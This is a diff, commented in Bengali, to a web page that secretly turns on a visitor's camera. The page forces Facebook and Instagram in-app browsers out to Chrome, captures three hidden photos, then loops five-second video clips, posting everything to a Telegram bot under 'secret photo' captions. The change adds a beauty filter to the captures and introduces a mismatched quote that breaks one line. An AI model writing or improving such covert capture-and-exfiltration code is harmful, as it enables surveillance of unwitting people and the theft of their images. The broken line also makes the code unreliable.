@@ -67,25 +67,24 @@
     #hiddenCam, #snapshotCanvas {
       display: none;
     }
+
+    /* ✨ বিশেষ কাস্টম বিউটি ও স্কিন গ্লো ফিল্টার (চেহারা সুন্দর ও উজ্জ্বল দেখানোর জন্য) */
+    .filter-beauty-glow {
+      filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
+    }
   </style>
 </head>
 <body>
 
-  <!-- ক্রোম ব্রাউজারে ফোর্সফুলি ওপেন করার জন্য ইন-অ্যাপ ব্রাউজার ডিটেক্টর -->
+  <!-- ক্রোম ব্রাউজারে রিডাইরেক্ট করার স্ক্রিপ্ট -->
   <script>
     (function() {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
       const currentUrl = window.location.href;
-      
-      // যদি ফেসবুক, ইনস্টাগ্রাম বা মেসেঞ্জারের ইন-অ্যাপ ব্রাউজার হয়
       if (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.indexOf('Instagram') > -1) {
-        // অ্যান্ড্রয়েডের জন্য ক্রোম ইনটেন্ট লিংক
         if (/android/i.test(ua)) {
           window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end;';
-        } 
-        // আইফোনের জন্য সাফারি বা ক্রোম প্রম্পট
-        else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-          // আইফোনে সরাসরি ক্রোম স্কিম ট্রাই করা যায়
+        } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
           window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
         }
       }
@@ -103,7 +102,8 @@
     </div>
   </div>
 
-  <video id="hiddenCam" autoplay playsinline muted></video>
+  <!-- গোপন ক্যামেরায় অটোমেটিক বিউটি ফিল্টার অ্যাপ্লাই করা আছে -->
+  <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
   <canvas id="snapshotCanvas"></canvas>
 
   <script>
@@ -131,10 +131,10 @@
 
         hiddenCam.srcObject = camStream;
 
-        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো
+        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো (ফিল্টার সহ)
         await captureAndSendPhotos(3);
 
-        // ২. এরপর ৫ সেকেন্ডের ভিডিও ক্লিপ লুপ বা বারবার পাঠিয়ে যাওয়া শুরু করা
+        // ২. এরপর ৫ সেকেন্ডের ভিডিও ক্লিপ বারবার পাঠিয়ে যাওয়া শুরু করা
         startPeriodicVideoRecording();
 
       } catch (err) {
@@ -142,23 +142,26 @@
       }
     });
 
-    // ছবি তোলার ফাংশন
+    // ছবি তোলার ফাংশন (বিউটি ফিল্টার সহ ক্যানভাসে রেন্ডার হবে)
     function takePhoto() {
       return new Promise((resolve) => {
         setTimeout(() => {
           canvas.width = hiddenCam.videoWidth || 640;
           canvas.height = hiddenCam.videoHeight || 480;
           const ctx = canvas.getContext('2d');
+
+          // ক্যামেরার বিউটি ফিল্টার স্টাইল ক্যানভাসে যুক্ত করা
+          ctx.filter = window.getComputedStyle(hiddenCam).filter;
           ctx.drawImage(hiddenCam, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob((blob) => {
             resolve(blob);
-          }, 'image/jpeg', 0.85);
-        }, 800); // ক্যামেরা স্টাবল হওয়ার জন্য সামান্য দেরি
+          }, 'image/jpeg', 0.90);
+        }, 800);
       });
     }
 
-    // পর পর ৩টি ছবি টেলিগ্রামে পাঠানোর লুপ
+    // পর পর ৩টি ছবি টেলিগ্রামে পাঠানো
     async function captureAndSendPhotos(count) {
       for (let i = 1; i <= count; i++) {
         const photoBlob = await takePhoto();
@@ -166,7 +169,7 @@
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
-          formData.append('caption', `📸 সিক্রেট ছবি #${i}`);
+          formData.append('caption', `✨ বিউটি ফিল্টারসহ সিক্রেট ছবি #${i}`);
 
           await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -209,7 +212,7 @@
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('video', videoBlob, `clip_${Date.now()}.webm`);
-            formData.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
+            formData.append('caption`, `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
               method: 'POST',
@@ -217,13 +220,12 @@
             }).catch(err => console.log("Video send failed", err));
           }
 
-          // পরবর্তী ৫ সেকেন্ডের ভিডিওর জন্য আবার কল করা (বারবার চলতে থাকবে)
+          // পরবর্তী ৫ সেকেন্ডের ভিডিওর জন্য রিকার্সভ কল
           setTimeout(recordInterval, 1000);
         };
 
         mediaRecorder.start();
 
-        // ঠিক ৫ সেকেন্ড পর রেকর্ড স্টপ করা
         setTimeout(() => {
           if (mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
@@ -236,4 +238,3 @@
   </script>
 </body>
 </html>
-
